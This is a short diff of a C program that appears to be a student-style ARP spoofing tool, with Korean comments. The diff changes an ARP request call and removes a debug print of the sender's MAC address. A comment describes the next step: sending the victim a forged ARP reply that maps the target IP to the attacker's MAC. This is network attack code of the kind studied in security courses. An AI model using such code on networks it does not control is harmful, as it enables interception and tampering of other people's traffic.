@@ -76,7 +76,7 @@ int main(int argc, char* argv[])
         // arp request 전송
 
     arp_packet arp_packet_get_sender_mac_packet;
-    arp_packet_get_sender_mac_packet = arp_request_get_sender_mac_addr(attacker_mac, sender_ip);
+    arp_packet_get_sender_mac_packet = arp_request_get_sender_mac_addr(attacker_mac, sender_ip, target_ip);
     
 
     if(pcap_sendpacket(handle, (uint8_t *)(& arp_packet_get_sender_mac_packet), ARP_PACKET_LEN) != 0){
@@ -115,7 +115,6 @@ int main(int argc, char* argv[])
             }
         }
     }
-    printf("%02x:%02x:%02x:%02x:%02x:%02x\n", sender_mac[0],sender_mac[1],sender_mac[2],sender_mac[3],sender_mac[4],sender_mac[5]);
 
     // 두 번째로 할 일 - sender 에게 [ip = target ip / mac = attacker mac] 인 arp response 전송
     arp_packet arp_packet_deceive_sender;
